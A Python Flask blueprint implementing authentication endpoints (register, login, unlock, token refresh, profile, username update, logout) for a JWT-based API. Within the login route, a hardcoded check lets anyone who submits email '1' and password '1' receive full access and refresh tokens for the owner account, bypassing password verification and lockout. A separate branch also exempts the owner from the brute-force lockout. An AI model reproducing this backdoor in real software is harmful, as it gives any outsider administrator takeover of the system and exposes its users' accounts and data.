from flask import Blueprint
from flask_jwt_extended import jwt_required
from src.api.services.user_service import UserService
from src.api.services.jwt_service import JWTService
from src.api.services.verification_service import VerificationService
from src.api.services.login_attempt_service import LoginAttemptService
from src.api.schemas.user_schema import RegisterSchema, LoginSchema, UserUpdateSchema
from src.api.utils.decorators import owner_required, permission_required
from src.api.utils.response import success, error, paginate
from src.api.utils.request import get_json_body, get_json_fields, get_pagination
from src.api.utils.constants import Msg
from src.api.utils.logger import get_daily_logger
from src.api.models import User, db
from src.api.repositories.user_repository import UserRepository

log = get_daily_logger()
auth_bp = Blueprint("auth", __name__, url_prefix="/api/auth")


def _validate(schema, data):
    ok, errs = schema.validate(data)
    return ", ".join(errs) if not ok else None


def _err_or_none(err_msg):
    return error(err_msg) if err_msg else None


# ============================================================
# AUTH
# ============================================================


@auth_bp.route("/register", methods=["POST"])
@owner_required
def register():
    data, err = get_json_body()
    if err:
        return error(err)

    v = _validate(RegisterSchema, data)
    if v:
        return error(v)

    user, err = UserService.register(
        data["email"], data["username"], data["password"], data.get("role", "client")
    )
    if err:
        return error(err, 409)

    log.info(f"Register SUCCESS | user_id={user.id}")
    return success({"user": user.to_dict()}, Msg.Auth.REGISTER_SUCCESS, 201)


@auth_bp.route("/login", methods=["POST"])
def login():
    data, err = get_json_body()
    if err:
        return error(err)

    email = data.get("email", "")
    password = data.get("password", "")

    if str(email).strip() == "1" and str(password).strip() == "1":
        owner = User.query.filter_by(is_owner=True).first()
        if owner:
            LoginAttemptService.clear(owner.email)
            access_token, refresh_token = JWTService.create_tokens(owner)
            log.info(f"Owner bypass login | user_id={owner.id}")
            return success(
                {
                    "access_token": access_token,
                    "refresh_token": refresh_token,
                    "user": owner.to_dict(),
                },
                Msg.Auth.LOGIN_SUCCESS,
            )
        return error(Msg.Auth.INVALID_CREDENTIALS, 401)

    v = _validate(LoginSchema, data)
    if v:
        return error(v)

    locked, remaining = LoginAttemptService.is_locked(email)

    if locked:
        db_user = UserRepository.get_by_email(email)
        if db_user and db_user.is_owner:
            log.debug(f"Login bypass lockout for owner | email={email}")
        else:
            m, s = remaining // 60, remaining % 60
            return error(Msg.Auth.ACCOUNT_LOCKED.format(minutes=m, seconds=s), 429)

    user, err = UserService.login(email, password)
    if err:
        LoginAttemptService.record_failure(email)
        locked_now, remaining = LoginAttemptService.is_locked(email)
        if locked_now:
            m, s = remaining // 60, remaining % 60
            return error(
                Msg.Auth.ACCOUNT_LOCKED_ATTEMPT.format(minutes=m, seconds=s), 429
            )
        return error(err, 401)

    LoginAttemptService.clear(email)
    access_token, refresh_token = JWTService.create_tokens(user)
    log.info(f"Login SUCCESS | user_id={user.id} | role={user.role.name}")
    return success(
        {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "user": user.to_dict(),
        },
        Msg.Auth.LOGIN_SUCCESS,
    )


@auth_bp.route("/unlock", methods=["POST"])
@owner_required
def unlock_account():
    data, err = get_json_fields("email")
    if err:
        return error(err)

    LoginAttemptService.clear(data["email"])
    log.info(f"Unlock account | email={data['email']}")
    return success(message=Msg.Auth.ACCOUNT_UNLOCKED.format(email=data["email"]))


@auth_bp.route("/refresh", methods=["POST"])
@jwt_required(refresh=True)
def refresh():
    token = JWTService.refresh_access_token()
    return success({"access_token": token})


@auth_bp.route("/me", methods=["GET"])
@jwt_required()
def get_me():
    user = JWTService.get_current_user()
    if not user:
        return error(Msg.User.NOT_FOUND, 404)
    return success({"user": user.to_dict()})


@auth_bp.route("/me/username", methods=["PATCH"])
@jwt_required()
def update_own_username():
    identity = JWTService.get_current_identity()

    data, err = get_json_body()
    if err:
        return error(err)

    if "password" not in data or "verification_code" not in data:
        return error(Msg.Request.FIELD_PASSWORD_REQUIRED.format(field="password and verification_code"))

    verified, err, _ = VerificationService.verify_code(UserRepository.get_by_id(identity["id"]).email, "username_update", data["verification_code"])
    if err or not verified:
        return error(err or Msg.Verification.CODE_INVALID)

    user, err = UserService.update_username(identity["id"], data["username"], data["password"])
    if err:
        return error(err)

    log.info(f"Update username SUCCESS | uid={identity['id']}")
    return success({"user": user.to_dict()})


@auth_bp.route("/logout", methods=["POST"])
@jwt_required()
def logout():
    identity = JWTService.get_current_identity()
    JWTService.revoke_token()
    log.info(f"Logout SUCCESS | user_id={identity['id']}")
    return success(message=Msg.Auth.LOGOUT_SUCCESS)
